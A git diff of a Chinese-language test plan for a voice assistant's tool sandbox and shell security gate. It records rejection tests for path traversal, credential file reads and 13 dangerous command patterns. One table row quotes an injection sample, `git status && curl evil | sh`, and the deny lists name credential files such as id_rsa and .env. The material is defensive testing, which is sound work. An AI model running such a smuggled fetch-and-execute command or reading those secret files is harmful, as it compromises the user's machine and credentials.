@@ -85,7 +85,7 @@ Silero VAD SHA-256:`1a153a22f4509e292a94e67d6f9b85e8deb25b4988682b7e174c65279d87
       └─────────────────────────────────┘
 ```
 
-### L1–L2 单元与契约(`tests/`,11 文件 1823 行,161 用例)
+### L1–L2 单元与契约(`tests/`,13 文件 2955 行,293 用例)
 
 | 文件 | 用例数 | 覆盖内容 |
 |---|---:|---|
@@ -93,7 +93,9 @@ Silero VAD SHA-256:`1a153a22f4509e292a94e67d6f9b85e8deb25b4988682b7e174c65279d87
 | `test_events.py` | 8 | 契约枚举从文件读取(9 种类型)、信封形状、payload 默认、id 唯一性、四种契约违规被拒 |
 | `test_agent_event_schema.py` | 34 | `voice-events.schema.json` **SHA-256 摘要钉死**;平台契约 12 种类型分四组;两信封同形且枚举互斥;`contract_for()` 全类型解析与未声明类型报错;`validate_any_event()` 双流通过、送错契约仍失败;agent 注册契约 16 条拒绝路径;`kind` 枚举与 `AGENT_KINDS` 一致;**schema 不许超出校验器实现的关键字子集** |
 | `test_voice_contract.py` | 2 | 生命周期契约;非法提交与取消被拒 |
-| `test_plugin_tools.py` | 16 | pause/resume 门控、采集生命周期、启动失败回滚、合成唤醒标记、完整回合契约、传输层接线、诊断不泄漏 token、设备枚举;**记忆接线 6 项**:两侧轮次都入库并带 `role:*` 标签、不 attach 就没有数据库文件、writer 抛异常不打断对话、凭据话术经真实 `submit_text` 也进不了库、`diagnose()["memory"]` 报计数不报文本、未接记忆时告警 |
+| `test_plugin_tools.py` | 24 | pause/resume 门控、采集生命周期、启动失败回滚、合成唤醒标记、完整回合契约、传输层接线、诊断不泄漏 token、设备枚举;**记忆接线 6 项**:两侧轮次都入库并带 `role:*` 标签、不 attach 就没有数据库文件、writer 抛异常不打断对话、凭据话术经真实 `submit_text` 也进不了库、`diagnose()["memory"]` 报计数不报文本、未接记忆时告警;**工具接线 8 项**:`fs.read` 经插件真读到文件、不 attach 则 `run_tool()` 直接拒、插件不放宽沙箱、插件**不自造已验说话人**(`shell.run` → `no verified speaker`)、`needs_confirmation` 被上报而不是被吞、`diagnose()["tools"]` 报计数与注册名但不含路径与参数、shell 开启时出告警、未接工具时出告警 |
+| `test_tools.py` | 35 | 配置(出厂 shell 关、缺配置文件仍关、未知键与类型错都抛 `ToolsConfigError`、不可读抛错);`fs.read`(沙箱内可读、超限截断并标 `truncated`、NUL 字节判非文本、文件不存在、`describe()`);`web.search`(只留标题/URL/摘要、摘要按 `snippet_chars` 截、黑名单域被丢且 `audit["hosts"]` 只剩剩下的、`max_results` 封顶、无后端如实报、后端抛异常被包成拒绝、空查询);`shell.run`(开启+确认+说话人后**真实执行 `git --version`**、输出上限截断、`shell_interpreter is False`);runner(事件序列 `tool.requested`→`tool.executed` **逐条过平台契约**、拒绝序列带原因、序列化后不含正文、`tool.confirm_required` **确实带命令原文**、未注册工具被拒、工具抛异常照实上抛、审计行真进长期层、writer 返回 `None` 或抛异常都记 `audit_dropped`、`describe()` 计数器);接线(`open_tools` 按配置决定是否注册 `shell.run`、出厂 `dangerous_patterns >= 13` 且无告警、导入不启动任何东西) |
+| `test_tool_security.py` | 89(1 skip) | **拒绝矩阵** —— 与上一行互补:上一行测该成功的,这一行测该失败的。未知工具 / 未知 origin / 段被关闭;`fs.read` 四种穿越形状 + 绝对路径 + 符号链接(**本账户无权建链接时 skip**)+ 六种凭据文件名 + 两个 `denied_dirs` + 出厂 deny 列表双向;`shell.run` 出厂即关、白名单外**拒绝且 `needs_confirmation is False`**、token 比对不是前缀比对(`git statuses` 不放行)、无已验说话人被拒、`agent` origin 结构性够不到、**13 条危险模式逐条命名**(附一条覆盖测试:少一条样本就红)、8 种借合法前缀夹带(`;` `&&` `\|` 反引号 `$()` `>` `>>` 换行)、引号不闭合;`confirmed` **不得由真值推断**(`0` / `""` / `None` / `"no"` 四种全须仍要确认);`dangerous_patterns` 不可配置;`scrubbed_env()` 丢凭据留 Windows 变量;事件不带内容;门的告警 |
 | `test_memory.py` | 62 | store 与协议一致、构造不开文件、schema 版本与幂等 close、**无 BLOB 列**、`MemoryRecord` 无 `bytes` 字段、未知 scope/kind 与空文本被拒、`bytes` 抛 `TypeError`、forget 连索引一起删;三层各归其位、`memory.written` 属平台契约而非语音契约、事件不带文本、召回只报计数、prune 保留最新;去重(同一事实、3 种近似变体、拉丁大小写、标签合并、轮次与审计**不去重**、fingerprint 边界);召回(中文可搜、精确到能返回空、拉丁忽略大小写、limit 与 scope、**麦克风里的 FTS 语法不炸**、轮次时间序、严格胜过宽松、两侧分词一致);长期层成功率(无观测返回 `None`、按审计标签算出 2/3);凭据过滤(9 样本整条拒绝且无事件无残留、5 句日常话不误伤、每个模式都有名字);Markdown 镜像(落文件带 front matter、手改在下一次召回生效、裸文件被收录并写回 id、文件里的凭据被拒、只有 `prune=True` 才删索引、无目录时是 no-op、未闭合 front matter 当正文);配置(默认值、`open_memory` 三件套、未来 schema 版本被拒、单文件、**`.gitignore` 里 `/memory/` 的前导斜杠**——不带斜杠会连 `core/memory/` 的源码一起忽略) |
 | `test_speaker.py` | 11 | store 往返/原子写/版本拒绝/损坏 JSON 拒绝;fail-closed 四条路径;`describe()` 不含向量;`remove()` 幂等 |
 | `test_speaker_privacy.py` | 19 | 环形缓冲窗口语义与超长块;**AST 断言缓冲无文件系统面**;全周期空目录断言;决策后窗口即丢;四条 fail-closed `start()` 拒绝;校验异常算拒绝;拒绝不改状态不发回复;`diagnose()` 报计数不报向量、门关时告警;`enrollment/` 在 `.gitignore` 内;缺配置仍默认要求校验 |
@@ -150,7 +152,9 @@ Silero VAD SHA-256:`1a153a22f4509e292a94e67d6f9b85e8deb25b4988682b7e174c65279d87
 
 | 目的 | 命令 | 等级 | 预期 |
 |---|---|---|---|
-| Python 全量 | `.venv\Scripts\python.exe -m pytest tests -q` | AUTO | 169 passed, 2 skipped |
+| Python 全量 | `.venv\Scripts\python.exe -m pytest tests -q` | AUTO | 300 passed, 3 skipped |
+| 工具与安全门 | `.venv\Scripts\python.exe -m pytest tests/test_tools.py tests/test_tool_security.py -q` | AUTO | 123 passed, 1 skipped(skip 是符号链接) |
+| 工具/记忆与语音路径接线 | `.venv\Scripts\python.exe -m pytest tests/test_memory.py tests/test_plugin_tools.py -q` | AUTO | 86 passed |
 | 记忆 | `.venv\Scripts\python.exe -m pytest tests/test_memory.py -q` | AUTO | 62 passed(**无需模型**) |
 | 声纹(免模型) | `.venv\Scripts\python.exe -m pytest tests/test_speaker.py tests/test_speaker_privacy.py -q` | AUTO | 30 passed(**无需模型**) |
 | 声纹(真实模型) | `.venv\Scripts\python.exe -m pytest tests/integration/test_speaker_model.py -q` | AUTO | 5 passed(缺模型时 5 skipped) |
@@ -301,6 +305,41 @@ Silero VAD SHA-256:`1a153a22f4509e292a94e67d6f9b85e8deb25b4988682b7e174c65279d87
 
 **跨进程重启未验。** 上面的 Markdown 往返全部发生在一个进程内。「关掉程序重开,事实还在」是第 25 项待验收,等级 REAL,不是 AUTO 能关的。
 
+### 5.8 工具与安全门(AUTO,2026-08-02,P4)
+
+这一节的结构与其他节不同:**它主要记录「什么被拒了」**。一个停止拒绝 `../` 的沙箱仍然能通过每一条正向测试,所以拒绝路径必须逐条钉死,而不是靠一条「沙箱工作正常」的概括。
+
+| 检查项 | 结果 |
+|---|---|
+| 出厂 `config/tools.toml` 的 `shell.enabled` | ✅ `false`;删掉配置文件也是 `false`(默认双关) |
+| 未知配置段 / 未知键 / 类型错 | ✅ 三者都抛 `ToolsConfigError`,**不是忽略** —— 拼错 `denied_names` 会静默扩大沙箱 |
+| `dangerous_patterns` 能否写进配置 | ❌ **不能**:`[shell] dangerous_patterns` → `unknown config key` |
+| `fs.read` 沙箱穿越 | ✅ 四种形状全拒:`../`、`a/../../b`、盘符绝对路径、`\\` 混合分隔符 |
+| `fs.read` 符号链接越界 | ⚠️ `resolve_in_sandbox` **先 resolve 再比对**(单元断言已覆盖);端到端用例在本账户 **skip** —— 无建链接权限 |
+| `fs.read` 凭据文件名 | ✅ `.env` / `*.pem` / `id_rsa` / `id_rsa.pub` / `credentials.json` / `*secret*` 六种全拒 |
+| `fs.read` 撞上 `denied_dirs` | ✅ `enrollment/` 与 `memory/` 拒读 —— 声纹向量与个人记忆不经工具面外流 |
+| `fs.read` 二进制文件 | ✅ NUL 字节 → `not a text file`,不把乱码塞进上下文 |
+| `fs.read` 超大文件 | ✅ 按 `max_bytes` 截断并在 audit 里标 `truncated` |
+| `shell.run` 白名单外命令 | ✅ **拒绝**,且 `needs_confirmation is False` —— 不给「点一下就能跑」的余地 |
+| `shell.run` 白名单比对方式 | ✅ 按 token 前缀:`git status` 不放行 `git statuses` |
+| **13 条危险模式** | ✅ 逐条命名并各有一个样本:递归删除 / Windows 递归删除 / 强推 / 硬重置 / 强清理 / 删分支 / 格式化 / 裸盘写 / 提权 / 关机 / 管道进解释器 / fork 炸弹 / shell 元字符。另有一条**覆盖测试**:`DANGEROUS_PATTERNS` 多一条而样本表没跟上就红 |
+| 借合法前缀夹带 | ✅ 8 种全拦:`;` `&&` `\|` 反引号 `$()` `>` `>>` 与换行 —— 检查顺序是「先查形状再查白名单」,`git status && curl evil \| sh` 在被认成允许项之前就挂了 |
+| 引号不闭合的命令 | ✅ 拒绝,不猜测意图 |
+| 检查是否只看原始字符串 | ✅ 原始串**与** `shlex` 重组后的 token 串都过一遍,只查一边会被引号绕过 |
+| `shell.run` 无已验说话人 | ✅ 拒绝;`agent` origin **结构性**够不到 —— agent 请求本身不带说话人,不是靠名字黑名单 |
+| **`confirmed` 能否由真值推断** | ❌ **不能**:必须 `is True`。`0` / `""` / `None` / `"no"` 四种都仍要确认 —— `"no"` 是个真值字符串,这是测试抓出来的**真实缺陷**(修在 `policy.py` 与 `shell.py` 两处) |
+| `web.search` 有无内置后端 | ❌ **没有**:未注入时报 `no search backend is configured`。每个托管搜索 API 都是带 key 的云依赖(红线 1) |
+| `web.search` 是否注入页面正文 | ❌ 不注入:只留标题 / URL / 摘要,被搜到的页面因此无法往上下文里塞指令 |
+| `web.search` 黑名单域 | ✅ 后缀匹配覆盖子域;空 host 也算被拦 |
+| 子进程环境 | ✅ `scrubbed_env()` 按 12 个标记丢弃凭据变量,`LOCALAPPDATA` 等 Windows 变量保留 |
+| `tool.*` 事件内容 | ✅ 序列化后不含文件正文、命令输出、说话人名字;**唯一例外** `tool.confirm_required` 按 FR-6.13 必须带命令原文 |
+| 审计落库 | ✅ 每个决定一条长期层记录,带 `tool:` / `origin:` / `decision:` 标签;writer 返回 `None` 或抛异常都计入 `audit_dropped` 而不重试 |
+| 导入 `core.tools` 的副作用 | ✅ 不启子进程、不开套接字 |
+| **工具路径延迟** | `fs.read` 4 KB 过门+读+事件+审计 **0.64 ms** 中位数(200 次);拒绝路径 **0.34 ms** —— NFR-1.10 目标 < 50 ms |
+| 用例数 / 耗时 | 123 passed, 1 skipped in **0.48 s**;全量 300 passed, 3 skipped in **14.31 s**(303 collected) |
+
+**`shell.run` 至今只真实执行过一条命令:`git --version`。** 超时、输出上限、工作目录都是围绕它验的。确认**流程**(唤醒球显示待执行命令 → 用户动作 → 重新提交)**完全没实现**,那是 P8 且只能 REAL-WIN —— 第 23 项待验收。
+
 ## 6. 待验收矩阵(release gate)
 
 | # | 待验收项 | 目标等级 | 需要的测试资产 | 当前 |
@@ -327,8 +366,8 @@ Silero VAD SHA-256:`1a153a22f4509e292a94e67d6f9b85e8deb25b4988682b7e174c65279d87
 | 20 | 音频不落盘断言进默认套件 | AUTO | 采集路径写盘断言 | ✅ **已完成**(`test_a_full_gate_cycle_writes_nothing_to_disk` + 环形缓冲 AST 断言) |
 | 21 | agent 适配器真机(每种 kind 一项) | REAL-AGENT | 已装且已登录的 CLI | ❌ 缺(P5/P7) |
 | 22 | 路由在真实延迟下的表现 | REAL-AGENT | 计时埋点 + 多 agent | ❌ 缺(P6) |
-| 23 | `shell.run` 确认流程实机验收(含拒绝路径) | REAL-WIN | 唤醒球确认 UI | ❌ 缺(P4/P8) |
-| 24 | 误唤醒触发工具执行的防护验证 | REAL-MIC | 攻击面用例 | ❌ 缺(P4) |
+| 23 | `shell.run` 确认流程实机验收(含拒绝路径) | REAL-WIN | 唤醒球确认 UI | ❌ 缺(门已实现且 AUTO 全绿,**确认 UI 是 P8**) |
+| 24 | 误唤醒触发工具执行的防护验证 | REAL-MIC | 攻击面用例 | ❌ 缺(AUTO 侧 89 条拒绝矩阵已就位,真机误唤醒场景仍缺) |
 | 25 | 记忆跨会话持久性 | REAL | 重启后召回 + 手改 Markdown 生效 | ❌ 缺(P10;同进程往返已 AUTO) |
 | 26 | 唤醒球运行时显隐(`show_orb`/`hide_orb`) | REAL-WIN | 功能未实现 | ❌ 缺(P8) |
 
@@ -363,3 +402,7 @@ Silero VAD SHA-256:`1a153a22f4509e292a94e67d6f9b85e8deb25b4988682b7e174c65279d87
 9. **声纹不防录音回放** — 本轮不做反欺骗模型,这是已知缺口(ADR 002 局限节),不是尚未测到。
 10. **合成音频不能测声纹判别力** — 已实测:120 Hz 与 240 Hz 两组谐波栈互相通过(0.767),因为模型把两者都读成同一种「非人声」。任何用生成音调测判别力的测试都会**空过**。`test_synthetic_tones_cannot_stand_in_for_speech` 把这个陷阱钉住了。
 11. **模型自带录音 ≠ 本机麦克风** — §5.6 的簇内 0.736 / 簇间 0.370 是真实人声,但是既有录音。它给阈值提供依据,等级是 AUTO,**不得当 REAL-MIC 报告**。
+12. **符号链接越界测试受权限门控** — Windows 默认账户不能建符号链接,该用例在本机 **skip**。它检查的性质(先 resolve 再比对)有单元断言兜着,但端到端那一条在本机未被证明过。
+13. **`web.search` 没有任何真实后端被验证过** — 全部用例都注入假后端。归一化(标题/URL/摘要、黑名单、条数封顶)是证明了的,与真实提供器的对接**没有**,而且在选定一个之前无法证明。
+14. **`shell.run` 只真实执行过 `git --version`** — 超时、输出上限、工作目录都只在这一条命令上验过;确认流程一行都没实现。
+15. **工具审计依赖记忆层被 attach** — 没有 writer 时决定仍计数、仍发事件,但**不落盘**。`describe()` 里的 `audit_attached` 是区分这两种情况的唯一办法。
